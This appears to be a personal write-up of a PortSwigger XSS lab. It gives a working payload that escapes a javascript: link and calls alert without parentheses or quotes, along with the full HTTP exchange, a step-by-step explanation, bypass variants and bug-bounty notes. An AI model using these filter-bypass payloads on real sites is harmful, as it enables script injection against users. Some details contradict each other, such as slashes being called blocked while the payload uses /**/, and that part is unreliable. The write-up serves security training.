# LAB: Reflected XSS into a JavaScript URL with some characters blocked

|                             |                                                                                                                                 |
| --------------------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| **Topic**                   | Cross-site scripting (XSS)                                                                                                    |
| **Difficulty**              | EXPERT                                                                                                                   |
| **Date**                    | 2026-11-26                                                                                                                     |
| **Time**                    |                     420                                                                                                            |
| **Solved without solution** | yes                                                                                                                             |
| **Link**                    | [lab-javascript-url-some-characters-blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked) |

## 1. Objective

Perform a Reflected Cross-Site Scripting (XSS) attack on an application where user input is reflected inside a pseudo-protocol JavaScript URL (`javascript:...`), and a Web Application Firewall (WAF) blocks specific characters (such as parenthesis `()`, single quotes, double quotes, and semicolons), executing `alert(1337)`.

## 2. Surface

- Dynamic links or redirection parameters reflected inside an `href` attribute containing a `javascript:` pseudo-protocol URL (e.g., `<a href="javascript:fetchUrl('USER_INPUT')">`).
- Server-side WAF filtering specific special characters and function invocation syntax.
- JavaScript URL reflection context: User input reflected directly inside a JavaScript function call within an inline `javascript:` URL scheme.

## 3. Hypothesis

If user input is reflected inside a `javascript:` URL scheme and standard invocation syntax (parentheses `()`) is blocked by a WAF, an attacker can leverage alternative JavaScript execution primitives—such as ES6 Template Literals with tagged template functions or throw/catch Exception handling constructs paired with `onerror`—to invoke functions or pass arguments without relying on filtered characters.

## 4. Payload that worked

Request:
```http
GET /post?postId=4&%27},toString=x=%3E{throw/**/onerror=alert,1337},window+%27%27,{x:%27 HTTP/2
Host: <host>.web-security-academy.net
Cookie: session=sess
Cache-Control: max-age=0
Sec-Ch-Ua: "Not:A-Brand";v="8", "Chromium";v="156"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

Response:
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 9857

<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d4%26%27},toString%3dx%3d%3e{throw/**/onerror%3dalert,1337},window+%27%27,{x%3a%27'}).finally(_ => window.location = '/')">Back to Blog</a>
```
## 5. Why it works

Analyzing the HTML response source revealed that input passed to the search parameter is reflected directly inside a JavaScript function call within an inline `javascript:` URL scheme on an anchor tag:

```html
<a href="javascript:fetchUrl('USER_INPUT')">Back</a>
```

The Web Application Firewall (WAF) enforces restrictive character filtering, blocking essential JavaScript syntax components including quotes (`'`, `"`), forward slashes (`/`), whitespace, and function call parentheses (`()`).

To bypass these constraints and execute `alert(1337)`:
1. **Closing the parameter string and opening an inline object**: Supplying `'},` prematurely closes the string argument passed to `fetchUrl()` and uses the comma operator `,` to append a new JavaScript expression/object within the evaluation context.
2. **Overriding `toString` and Exception Hijacking**: Defining `toString=x=>{throw/**/onerror=alert,1337}` overrides the default `Object.prototype.toString` method on the object. The arrow function body uses `throw` paired with an assignment to the global `onerror` event handler (`onerror=alert`) to catch thrown exceptions, passing the integer `1337` to `alert` without using function call parentheses `()`. A inline comment `/**/` replaces whitespace to satisfy WAF character restrictions.
3. **Implicit Type Coercion**: Appending `window+''` forces the JavaScript engine to perform string concatenation on the `window` object and the newly constructed object context. This coercion implicitly triggers `.toString()`, executing the overridden method, raising the exception, firing `onerror`, and executing `alert(1337)`.
4. **Syntax Balancing**: Appending `,x:'` absorbs the remaining closing string fragment (`')`) supplied by the application template, preventing a JavaScript syntax error from breaking script parsing.

## 6. What I tried that failed

- Attempting to break out of the string using standard double quotes (`"`) or forward slashes (`/`) resulted in immediate HTTP 400/403 blocks by the WAF.
- Trying standard function call syntax (`alert(1337)` or `alert'1337'`) failed because parentheses `()` were explicitly filtered.
- Fuzzing character bounds in DevTools confirmed that while parentheses and quotes were blocked, object declaration syntax (`{}`), arrow functions (`=>`), comma operators (`,`), and comment blocks (`/**/`) passed through unencoded.
- Rule extracted: When parentheses, quotes, and whitespace are blocked in a JavaScript context, execution can be achieved by overriding object coercion hooks (`toString`, `valueOf`) and triggering implicit type conversion via arithmetic/string operators (`+''`), using `throw` paired with `onerror` to bypass parenthesis-based function invocation.

## 7. In a real target (bounty translation)

- Where it shows up: Dynamic back-buttons, client-side pagination links, and share triggers using inline `javascript:` pseudo-protocols behind strict WAF filters.
- Quick detection: Fuzzing restricted characters (parentheses, quotes, backticks, spaces) within `javascript:` context inputs to map WAF filter boundaries.
- Impact: Reflected XSS execution bypassing input filters that assume blocking `()` prevents JavaScript execution.
- In the report: Document the `javascript:` link reflection, detail the character restrictions imposed by the perimeter WAF, demonstrate the alternative invocation primitive PoC, and supply reproduction steps.

## 8. Bypass / variants noticed

- Overriding `valueOf` instead of `toString` and triggering coercion using unary arithmetic operators (e.g., `+object`).
- Utilizing ES6 tagged template literals (e.g., `alert`1337``) on WAFs that permit backticks.
- Using `Symbol.toPrimitive` overrides to intercept implicit type conversions in modern JavaScript engines.

## 9. Takeaway

Filtering function call parentheses `()` or quotes is insufficient to prevent XSS inside JavaScript execution contexts. Secure designs should avoid using `javascript:` pseudo-protocols entirely and rely on standard event listeners with proper output encoding.
